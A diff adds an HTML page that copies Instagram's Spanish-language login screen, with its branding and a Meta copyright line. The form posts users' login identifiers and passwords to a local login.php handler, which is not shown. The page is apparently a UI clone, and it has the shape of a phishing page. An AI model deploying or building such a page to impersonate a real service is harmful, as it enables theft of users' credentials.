@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram clone</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+
+                        <form action="login.php" method="post">
+                    <label for="email" class="sr-only">Teléfono, usuario o correo electrónico</label>
+                    <input type="text" name="email" placeholder="Teléfono, usuario o correo electrónico" />
+
+                    <label for="password" class="sr-only">Contraseña</label>
+                    <input name="pass" type="password" placeholder="Contraseña" />
+
+                    <button type="submit">Iniciar sesión</button>
+                </form>
+           
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">O</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Iniciar sesión con Facebook</a>
+                    </div>
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>¿No tienes una cuenta?</p>
+                <a href="#">Regístrate</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Obten la aplicacion.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
+                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Condiciones</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Empleo</a></li>
+            <li><a href="#">Ayuda</a></li>
+            <li><a href="#">Terminos</a></li>
+            <li><a href="#">Ubicaciones</a></li>
+            <li><a href="#">Threads</a></li>
+            <li><a href="#">Meta Verified</a></li>
+            <li><a href="#">Idioma</a></li>
+        </ul>
+        <p class="copyright">© 2025 Instagram from Meta</p>
+    </footer>
+</body>
+</html>
